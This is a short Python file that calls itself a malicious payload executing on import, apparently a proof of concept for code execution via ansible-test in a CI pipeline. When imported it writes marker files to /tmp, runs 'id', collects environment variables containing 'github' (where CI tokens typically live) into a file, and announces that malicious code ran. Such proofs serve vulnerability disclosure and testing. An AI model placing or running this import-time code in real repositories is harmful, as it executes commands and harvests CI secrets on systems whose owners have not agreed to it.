# Malicious payload that executes on import
import os
import sys

# Create a marker file
with open('/tmp/hb_payload_executed.txt', 'w') as f:
    f.write('HB-TEST-EXEC: Payload executed via ansible-test\n')

# Try to execute command and capture output
os.system('id > /tmp/hb_id.txt 2>&1')
os.system('env | grep -i github > /tmp/hb_env.txt 2>&1')
os.system('echo "HB-TEST-EXEC $(date)" > /tmp/hb_timestamp.txt')

print("HB-TEST-EXEC: Malicious code executed!", file=sys.stderr)